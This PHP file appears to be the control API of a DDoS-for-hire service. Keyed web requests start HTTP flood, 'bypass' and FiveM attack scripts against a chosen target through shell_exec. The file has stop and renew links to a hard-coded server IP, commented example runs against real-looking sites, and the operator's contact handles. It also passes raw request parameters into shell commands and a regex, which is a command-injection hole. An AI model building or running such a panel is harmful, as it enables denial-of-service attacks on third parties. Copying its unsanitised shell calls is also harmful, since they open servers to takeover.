<?php
echo("<title>api</title>");
echo '<link rel="shortcut icon" href="fav.ico"/>';
error_reporting(0);
$target = $_GET['target'];
$key = $_GET['key'];
$time = $_GET['time'];
$method = $_GET['method'];
$postdata = $_GET['postdata'];
$httpversion = $_GET['httpversion'];
$referer = $_GET['referer'];
$useragent = $_GET['useragent'];
$concurrent = $_GET['concurrent'];
$cookie = $_GET['cookie'];

if (!($target) || !($key) || !($time) || !($method)) die('403 - Access forbidden');
if (!(is_numeric($time))) die('Invalid time.');
if (!(preg_match('/'.$key.'/', file_get_contents('keys.txt')))) die('Invalid key.');

$str=rand();
$result = md5($str);
$encoded=md5($target);
$crypto=md5($key);

/*node httpgorilla.js url time httpversion postdata threads cookie*/
/*node method.js https://iplogger.org/2EnXb6 60 HTTP/2 5 null https://skidush.com/ null null*/
//node method.js http://62.171.178.31/ 60 HTTP/2 5 null "https://ac-rouen.fr/" "HTTP-LUCKY FLOOD" null
//--duration TEMPS --threads THREADS --method METHODE --body POSTDATA --ratelimit ACTIVATION OU NON --cookie COOKIE
switch($method) {
        case 'HTTP-REQUEST': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurrent --method GET --body null --ratelimit deactivate --cookie false");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                echo "<br>";
                echo '<a href="http://62.171.178.31/api.php?key=' . $key . '&target=' . $target . '&time=' . $time . '&method=STOP">Kill the attack</a> | <a href="http://62.171.178.31/api.php?key=' . $key . '&target=' . $target . '&time=' . $time . '&method=' . $method .'">Renew attack</a>';
               break;
        case 'HTTP-DATA': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurrent --method GET --body $postdata --ratelimit deactivate --cookie null");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                break;
        case 'HTTP-COOKIE': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurrent --method GET --body false --ratelimit deactivate --cookie $cookie");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                break;
        case 'HTTPS-BYPASS': $output = shell_exec("screen -dms $key node bypas $target $time $concurrent GET 10 false false false proxys.txt");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                break;
        case 'HTTP-POSTCOOKIE': $output = shell_exec("screen -dmS $key node index.js $target --duration $time --threads $concurrent --method GET --body $postdata --ratelimit deactivate --cookie $cookie");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                break;
        case 'RENEW-PROXY': $output = shell_exec("screen -dmS $key bash proxy.sh");
                echo "<center><body><pre>";
                echo "Proxylist <strong>successfuly</strong> renewed\nplease wait 1 minute before start attack.";
               break;
        case 'HTTP-FIVEM': $output = shell_exec("screen -dmS $key node fivemBypassV2.js $target $time $concurrent NO all 150");
                echo "<center><body><pre>";
                echo "URL: <strong>$encoded</strong>\n";
                echo "URL (decoded): <strong>$target</strong>\n";
                echo "Handler: <strong>$result</strong>\n";
                echo "<br>";
                echo '<a href="http://62.171.178.31/api.php?key=' . $key . '&target=' . $target . '&time=' . $time . '&method=STOP">Kill the attack</a> | <a href="http://62.171.178.31/api.php?key=' . $key . '&target=' . $target . '&time=' . $time . '&method=' . $method .'">Renew attack</a>';
               break;
        case 'HELP':
                echo "<pre><center>Parameters available: (HELP, ABOUT, UPTIME, STOP, STOPALL)</center></pre>";
               break;
        case 'ABOUT':
                echo "<pre><center>my <strong><a href='https://t.me/C0DINGSTONE' target='_blank'>telegram</a></strong> contact<br>my discord: <strong>~Jas#1495</strong></pre></center>";
                break;
        case 'UPTIME':
                $output = shell_exec("uptime --pretty");
                echo "<pre><center>$output</center></pre>";
                break;
        case 'STOP':
                $output = shell_exec("pkill -f $key");
                die("<pre><center>Running attacks on <strong>$target</strong> has been stopped!</center></pre>");
                break;
        case 'STOPALL':
                $output = shell_exec("pkill -9 node");
                echo "<pre><center>All attacks running on the key `<strong>$crypto</strong>` has been stopped!</center></pre>";
                break;
        default:
                die('Invalid method.');
}

return;
?>
